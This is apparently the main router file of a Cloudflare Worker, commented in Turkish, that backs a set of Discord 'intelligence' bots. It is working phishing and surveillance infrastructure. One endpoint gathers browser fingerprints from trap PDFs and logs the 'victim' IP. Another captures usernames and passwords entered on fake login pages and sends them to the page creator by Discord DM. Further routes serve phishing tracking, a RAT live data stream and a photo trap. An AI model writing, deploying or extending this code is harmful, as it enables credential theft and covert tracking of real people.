import { verifyDiscordSignature } from './utils/helpers.js';
import { handleGetRoutes } from './endpoints/getRoutes.js';
import { handleHaberBot } from './bots/haberBot.js';
import { handleKanserBot } from './bots/kanserBot.js';
import { handleWebOsintBot } from './bots/webOsintBot.js';
import { handleMobilOsintBot } from './bots/mobilOsintBot.js';
import { handleSosyalMuhBot } from './bots/sosyalMuhBot.js';
import { handleGozetimBot } from './bots/gozetimBot.js';
import { handleDerinWebBot } from './bots/derinWebBot.js';
import { handleSosyalMedyaBot } from './bots/sosyalMedyaBot.js';
import { handleGuvenlikBot } from './bots/guvenlikBot.js';
import { handleCografiBot } from './bots/cografiBot.js';
import { handleCookiesBot } from './bots/cookiesBot.js';

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // CORS Preflight (PDF JavaScript fetch icin)
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        }
      });
    }

    // 1. GET ISTEKLERI (Tarayici Yonlendirmeleri /not/, /l/, /o/)
    if (request.method === 'GET') {
      return await handleGetRoutes(request, url, env, ctx);
    }

    // POST /o/:id — Oltalama tracking verileri
    if (request.method === 'POST' && url.pathname.startsWith('/o/')) {
      return await handleGetRoutes(request, url, env, ctx);
    }

    // POST /v/:id — RAT canli veri akisi
    if (request.method === 'POST' && url.pathname.startsWith('/v/')) {
      return await handleGetRoutes(request, url, env, ctx);
    }

    // POST /p/:id — Foto tuzak veri akisi
    if (request.method === 'POST' && url.pathname.startsWith('/p/')) {
      return await handleGetRoutes(request, url, env, ctx);
    }

    // POST /monitor — KanserTools monitoring
    if (request.method === 'POST' && url.pathname === '/monitor') {
      return await handleGetRoutes(request, url, env, ctx);
    }

    // /log-pdf: PDF fingerprnt verisi kurbandan geldiginde kanala ilet
    if (request.method === 'POST' && url.pathname === '/log-pdf') {
      try {
        const data = await request.json();
        const kurbanIP = request.headers.get('cf-connecting-ip') || 'Bilinmiyor';

        let report = `[KRITIK] **PDF Fingerprint Raporu**\n\n`;
        report += `**Kurban IP:** \`${kurbanIP}\`\n`;
        report += `**PDF Adi:** ${data.pdfName || 'Bilinmiyor'}\n`;
        report += `**Tarih:** ${data.timestamp || new Date().toISOString()}\n\n`;
        report += `**User-Agent:** ${data.userAgent || 'Yok'}\n`;
        report += `**Platform:** ${data.platform || 'Yok'}\n`;
        report += `**Zaman Dilimi:** ${data.timezone || 'Yok'}\n`;
        report += `**Diller:** ${Array.isArray(data.languages) ? data.languages.join(', ') : 'Yok'}\n`;
        report += `**CPU Cekirdek Sayisi:** ${data.hardwareConcurrency || 'Yok'}\n`;
        report += `**Bellek:** ${data.deviceMemory ? data.deviceMemory + ' GB' : 'Yok'}\n\n`;

        if (data.screen) {
          report += `**Ekran:** ${data.screen.width}x${data.screen.height} (Kullanim: ${data.screen.availWidth}x${data.screen.availHeight}, Renk Derinligi: ${data.screen.colorDepth})\n`;
        }

        if (data.webgl && data.webgl !== 'N/A') {
          report += `**GPU:** ${data.webgl.renderer || 'Bilinmiyor'}\n`;
          report += `**GPU Vendor:** ${data.webgl.vendor || 'Bilinmiyor'}\n`;
          report += `**WebGL Surumu:** ${data.webgl.version || 'Bilinmiyor'}\n`;
        }

        if (data.audio && data.audio !== 'N/A') {
          report += `**Audio Ornek Hizi:** ${data.audio.sampleRate || 'Yok'} Hz\n`;
        }

        if (data.canvas && data.canvas !== 'N/A') {
          report += `**Canvas Fingerprint:** \`${String(data.canvas).slice(0, 100)}...\`\n`;
        }

        if (data.performance && data.performance !== 'N/A') {
          report += `**JS Heap:** ${data.performance.usedJSHeapSize ? (data.performance.usedJSHeapSize / 1048576).toFixed(1) + ' MB' : 'Yok'} / ${data.performance.totalJSHeapSize ? (data.performance.totalJSHeapSize / 1048576).toFixed(1) + ' MB' : 'Yok'}\n`;
        }

        // Discord 2000 karakter limitini asma
        if (report.length > 1900) report = report.slice(0, 1900) + '\n\n[Veriler kirpildi]';

        // Log hedefini KV'den oku
        const pdfId = url.searchParams.get('id');
        let logHedefi = 'log-kanali';
        let creatorId = null;
        if (pdfId) {
          const cfgStr = await env.KV.get(`pdfcfg_${pdfId}`);
          if (cfgStr) {
            const cfg = JSON.parse(cfgStr);
            logHedefi = cfg.logHedefi || 'log-kanali';
            creatorId = cfg.creatorId;
          }
          // Fingerprint verisini KV'ye JSON olarak kaydet (analiz icin)
          const fpKey = `fp_${pdfId}_${Date.now()}`;
          await env.KV.put(fpKey, JSON.stringify({ ...data, kurbanIP, pdfId, raporTarihi: data.timestamp || new Date().toISOString() }), { expirationTtl: 2592000 });
        }

        const CHANNEL_ID = '1515977275533955142';
        const botHeaders = {
          'Authorization': `Bot ${env.DISCORD_TOKEN}`,
          'Content-Type': 'application/json'
        };

        if (logHedefi === 'dm' && creatorId) {
          // Kullanicinin DM kanalina gonder
          try {
            const dmRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
              method: 'POST',
              headers: botHeaders,
              body: JSON.stringify({ recipient_id: creatorId })
            });
            if (dmRes.ok) {
              const dmChannel = await dmRes.json();
              await fetch(`https://discord.com/api/v10/channels/${dmChannel.id}/messages`, {
                method: 'POST',
                headers: botHeaders,
                body: JSON.stringify({ content: report })
              });
            }
          } catch (e) { }
        } else {
          // Log kanalina gonder
          await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: botHeaders,
            body: JSON.stringify({ content: report })
          });
        }

        return new Response('OK', {
          status: 200,
          headers: { 'Access-Control-Allow-Origin': '*' }
        });
      } catch (err) {
        return new Response('Hata', { status: 500 });
      }
    }

    // /login-callback/: Fake login sayfasindan gelen bilgileri yakala
    if (request.method === 'POST' && url.pathname.startsWith('/login-callback/')) {
      try {
        const pageId = url.pathname.split('/login-callback/')[1];
        if (!pageId) return new Response('Gecersiz istek', { status: 400 });

        const bodyText = await request.text();
        const params = new URLSearchParams(bodyText);
        const pageDataStr = await env.KV.get(`login_${pageId}`);
        if (!pageDataStr) return new Response('Sayfa bulunamadi', { status: 404 });

        const pageData = JSON.parse(pageDataStr);
        const fields = Array.isArray(pageData.fields) ? pageData.fields : ['E-posta', 'Sifre'];
        const kurbanIP = request.headers.get('cf-connecting-ip') || 'Bilinmiyor';
        const userAgent = request.headers.get('user-agent') || 'Bilinmiyor';

        let credentials = '';
        fields.forEach((f, i) => {
          credentials += `**${f}:** ${params.get(`f${i}`) || 'Girilmedi'}\n`;
        });

        const report = `[ALARM] **Fake Login - Hesap Bilgileri ELE GECTIRILDI!**\n\n` +
          `**Platform:** ${pageData.tur || 'Bilinmiyor'}\n\n` +
          `${credentials}\n` +
          `**Kurban IP:** \`${kurbanIP}\`\n` +
          `**User-Agent:** ${userAgent.slice(0, 200)}\n` +
          `**Tarih:** ${new Date().toISOString()}`;

        if (pageData.creatorId) {
          try {
            const dmRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
              method: 'POST',
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ recipient_id: pageData.creatorId })
            });
            if (dmRes.ok) {
              const dm = await dmRes.json();
              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
                method: 'POST',
                headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: report })
              });
            }
          } catch(e) {}
        }

        return new Response('OK', { status: 200 });
      } catch (err) {
        return new Response('Hata', { status: 500 });
      }
    }

    // Yalnizca POST Isteklerine (Discord Webhook) Izin Ver
    if (request.method !== 'POST') return new Response('Metot izin verilmedi', { status: 405 });

    // 2. YENI BOT YONLENDIRMELERI
    // Web OSINT Botu
    if (url.pathname === '/web-osint') {
      const isValid = await verifyDiscordSignature(request, env.WEB_OSINT_PUBLIC_KEY);
      if (!isValid) return new Response('Web OSINT Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleWebOsintBot(interaction, request, env, ctx);
    }

    // Mobil OSINT Botu
    if (url.pathname === '/mobil-osint') {
      const isValid = await verifyDiscordSignature(request, env.MOBIL_OSINT_PUBLIC_KEY);
      if (!isValid) return new Response('Mobil OSINT Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleMobilOsintBot(interaction, request, env, ctx);
    }

    // Sosyal Muhendislik Botu
    if (url.pathname === '/sosyal-muh') {
      const isValid = await verifyDiscordSignature(request, env.SOSYAL_MUH_PUBLIC_KEY);
      if (!isValid) return new Response('Sosyal Muh Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleSosyalMuhBot(interaction, request, env, ctx);
    }

    // Gozetim Botu
    if (url.pathname === '/gozetim') {
      const isValid = await verifyDiscordSignature(request, env.GOZETIM_PUBLIC_KEY);
      if (!isValid) return new Response('Gozetim Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleGozetimBot(interaction, request, env, ctx);
    }

    // Derin Web Botu
    if (url.pathname === '/derin-web') {
      const isValid = await verifyDiscordSignature(request, env.DERIN_WEB_PUBLIC_KEY);
      if (!isValid) return new Response('Derin Web Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleDerinWebBot(interaction, request, env, ctx);
    }

    // Sosyal Medya OSINT Botu
    if (url.pathname === '/sosyal-medya') {
      const isValid = await verifyDiscordSignature(request, env.SOSYAL_MEDYA_PUBLIC_KEY);
      if (!isValid) return new Response('Sosyal Medya Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleSosyalMedyaBot(interaction, request, env, ctx);
    }

    // Guvenlik Botu
    if (url.pathname === '/guvenlik') {
      const isValid = await verifyDiscordSignature(request, env.GUVENLIK_PUBLIC_KEY);
      if (!isValid) return new Response('Guvenlik Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleGuvenlikBot(interaction, request, env, ctx);
    }

    // Cografi OSINT Botu
    if (url.pathname === '/cografi-osint') {
      const isValid = await verifyDiscordSignature(request, env.COGRAFI_PUBLIC_KEY);
      if (!isValid) return new Response('Cografi OSINT Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleCografiBot(interaction, request, env, ctx);
    }

    // Kanser Cookies Botu
    if (url.pathname === '/cookies') {
      const isCookiesValid = await verifyDiscordSignature(request, env.COOKIES_PUBLIC_KEY);
      if (!isCookiesValid) return new Response('Cookies Botu: Gecersiz istek imzasi', { status: 401 });
      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleCookiesBot(interaction, request, env, ctx);
    }

    // Haber Botu (ana endpoint)
    if (url.pathname === '/haber') {
      const isHaberValid = await verifyDiscordSignature(request, env.HABER_PUBLIC_KEY);
      if (!isHaberValid) return new Response('Haber Botu: Gecersiz istek imzasi', { status: 401 });

      const bodyText = await request.text();
      const interaction = JSON.parse(bodyText);
      return await handleHaberBot(interaction, request, env, ctx);
    }

    // 3. KANSER ISTIHBARAT (ANA BOT) YONLENDIRMESI
    const isMainValid = await verifyDiscordSignature(request, env.DISCORD_PUBLIC_KEY);
    if (!isMainValid) return new Response('Kanser Bot: Gecersiz istek imzasi', { status: 401 });

    const bodyText = await request.text();
    const interaction = JSON.parse(bodyText);
    return await handleKanserBot(interaction, request, env, ctx, url);
  }
};